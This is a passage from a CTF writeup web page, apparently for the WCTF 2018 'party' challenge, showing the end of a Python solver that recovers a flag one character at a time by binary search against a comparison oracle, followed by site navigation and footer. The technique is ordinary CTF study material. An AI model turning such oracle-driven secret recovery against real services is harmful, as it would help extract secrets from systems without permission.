</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>res</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># character is too small, or the string is too short</span>
</span></span><span class=line><span class=cl>            <span class=n>minv</span> <span class=o>=</span> <span class=n>minv</span> <span class=o>+</span> <span class=p>(</span><span class=n>maxv</span> <span class=o>-</span> <span class=n>minv</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>res</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># character is too big</span>
</span></span><span class=line><span class=cl>            <span class=n>maxv</span> <span class=o>=</span> <span class=n>minv</span> <span class=o>+</span> <span class=p>(</span><span class=n>maxv</span> <span class=o>-</span> <span class=n>minv</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Flag found!&#39;</span><span class=p>,</span> <span class=n>newflag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># check off-by-one because of the different string length</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>testflag</span><span class=p>(</span><span class=n>flag</span> <span class=o>+</span> <span class=n>newchar</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>newchar</span> <span class=o>=</span> <span class=nb>chr</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>newchar</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/2018-07-08-wctf-2018-party/index.md data-oid-likes=likes_writeups/2018-07-08-wctf-2018-party/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/writeups/2018-06-30-google-ctf-2018-dogestore/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">DOGESTORE - Google CTF 2018</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2018-06-30T00:00:00+00:00>30 June 2018</time>
</span></span></a></span><span><a class="flex text-right group ml-3" href=/writeups/2018-12-30-35c3ctf-newphonewhodis/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">newphonewhodis - 35c3ctf</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2018-12-30T00:00:00+00:00>30 December 2018</time>
</span></span><span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div id=top-scroller class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href title></a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
mhackeroni</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://mhackeroni.it/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>